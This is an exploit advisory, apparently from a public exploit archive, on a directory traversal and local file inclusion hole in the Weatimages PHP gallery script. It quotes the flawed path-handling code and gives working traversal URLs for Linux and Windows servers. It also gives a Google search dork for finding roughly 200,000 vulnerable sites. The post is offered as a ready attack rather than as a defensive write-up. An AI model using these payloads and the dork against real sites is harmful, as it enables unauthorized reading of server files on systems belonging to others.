Weatimages Directory Traversal and LFI Vulnerabilities
======================================================

Weatimages Directory Traversal&Local File Include Vulnerabilities
 
By: e.wiZz!
 
 
############Script info:
 
############Site: http://nazarkin.name/projects/weatimages/download.php
 
 
 
In the wild...
 
#######################################################
 
 
#######index.php:
 
...
 
//kill oneself if user trying to access resource with &#039;/../&#039; in path
if (strstr(urldecode($_SERVER[&#039;REQUEST_URI&#039;]), &#039;/../&#039;)) { fatal_error(&#039;Suspicious query rejected&#039;); }
 
...
 
if (!$REQUEST_PATH) {
    if ($_GET[&#039;path&#039;]) { //compatibility mode enabled and we have some path
        $REQUEST_PATH = $_GET[&#039;path&#039;];
        $SERVER_PHP_SELF = $_SERVER[&#039;SCRIPT_NAME&#039;] . &#039;/&#039; . $REQUEST_PATH . &#039;/&#039;;
    }
    else { //we are in the root directory
        $REQUEST_PATH = &#039;.&#039;;
    }
}
 
...
 
...huh, did you know there are Windows servers?
 
#####List files in directory you want(linux):
 
http://inthewild/index.php?path=../
http://inthewild/index.php?path=../..
 
##### Windows?:
 
http://inthewild/index.php?path=..\anything
 
 
########Dork:
http://www.google.ba/#hl=bs&q=%22Powered+by+Weatimages%22&start=20&sa=N&fp=73afe0b6734a45d2  (google says 200 000,i dont trust them)



